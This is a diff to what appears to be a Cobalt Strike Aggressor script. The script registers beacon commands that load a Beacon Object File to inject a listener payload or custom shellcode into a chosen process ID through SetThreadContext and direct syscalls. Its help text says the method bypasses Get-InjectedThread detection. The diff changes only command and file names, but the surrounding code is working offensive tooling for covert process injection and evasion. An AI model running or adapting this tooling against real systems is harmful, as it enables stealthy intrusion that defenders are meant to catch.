@@ -2,13 +2,13 @@
 # Date: Apr 2021
 # $1 = beacon ID
 # $2 = pid
-# x86_64-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.o -masm=intel
+# x86_64-w64-mingw32-gcc -c syscall_stc_inject.c -o syscall_stc_inject.o -masm=intel
 
 alias syscall_stc_shinject {
 	local('$handle $data $args $sc_data $filename $extension');
 	
 	# read in the right BOF file
-	$handle = openf(script_resource("syscall_stcinject.o"));
+	$handle = openf(script_resource("syscall_stc_inject.o"));
 	$data = readb($handle, -1);
 	closef($handle);
 
@@ -45,12 +45,12 @@ alias syscall_stc_shinject {
 
 }
 
-alias syscall_stcinject {
+alias syscall_stc_inject {
 	local('$bid $handle $data $pid $listener $payload');
 
 	# check our arguments
 	if (size(@_) != 3) {
-		berror($1, "syscall_stcinject: not enough arguments. Enter the PID and Listener");
+		berror($1, "syscall_stc_inject: not enough arguments. Enter the PID and Listener");
 		return;
 	}
 
@@ -61,12 +61,12 @@ alias syscall_stcinject {
 	# Verify PID is a number
 	if ((!-isnumber $pid) || (int($pid) <= 0))
 	{
-		berror($1, "syscall_stcinject: enter a valid PID");
+		berror($1, "syscall_stc_inject: enter a valid PID");
 		return;
 	}
 
 	# read in our BOF file...
-	$handle = openf(script_resource("syscall_stcinject.o"));
+	$handle = openf(script_resource("syscall_stc_inject.o"));
 	$data	= readb($handle, -1);
 	closef($handle);
 
@@ -92,7 +92,7 @@ alias syscall_stcinject {
 		beacon_inline_execute($1, $data, "go", $args);
 	}
 }
-beacon_command_register("syscall_stcinject", "XPN's SetThreadContext injection method with direct syscalls.", "Synopsis: syscall_stcinject [pid] [listener] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method.");
+beacon_command_register("syscall_stc_inject", "XPN's SetThreadContext injection method with direct syscalls.", "Synopsis: syscall_stc_inject [pid] [listener] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method.");
 
 beacon_command_register("syscall_stc_shinject", "Direct syscalls to execute custom shellcode (.bin) from disk.", "Synopsis: syscall_stc_shinject [pid] [path/to/payload.bin] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method using custom shellcode from disk.\nOption: From dll to .bin with SRDI.");
 
